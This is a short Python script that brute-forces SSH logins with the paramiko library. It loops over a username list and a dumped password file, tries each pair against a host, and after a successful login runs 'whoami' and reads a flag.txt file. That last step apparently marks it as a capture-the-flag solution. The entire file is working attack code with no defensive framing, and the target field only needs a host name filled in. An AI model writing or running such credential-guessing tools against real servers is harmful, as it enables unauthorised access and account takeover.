import paramiko
import time

from paramiko.ssh_exception import SSHException

host = ""
port = 22

with open('C:/Users/TECHNORON/Downloads/Passwords(Dump)/password.txt','r', encoding='latin-1') as u_pass:
    passwords = [line.strip() for line in u_pass]

with open('C:/Users/TECHNORON/Downloads/usernames.txt','r') as u_user:
    usernames = [line.strip() for line in u_user]

client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

for username in usernames:
    for password in passwords:
        try:
            print(f"Trying {username}:{password}")
            client.connect(hostname=host, port=port, password=password, username=username, timeout=3)

            print(f"Successful login of {username}:{password}")
            stdin, stdout, stderr = client.exec_command('whoami')
            logged_in_user = stdout.read().decode().strip()

            flag_path = f"/home/{logged_in_user}/Desktop/flag.txt"
            stdin, stdout, stderr = client.exec_command(f'cat {flag_path}')
            print("Flag:", stdout.read().decode().strip())
            client.close()
            exit()
        except paramiko.AuthenticationException:
            print("Authentication Failed")

        except SSHException as e:
            print("Too Many Attempts Failed: ",e)
            time.sleep(5)

        except Exception as e:
            print("UnExpected Error Occurred: ",e)

print("No Matching Credentials Found!")




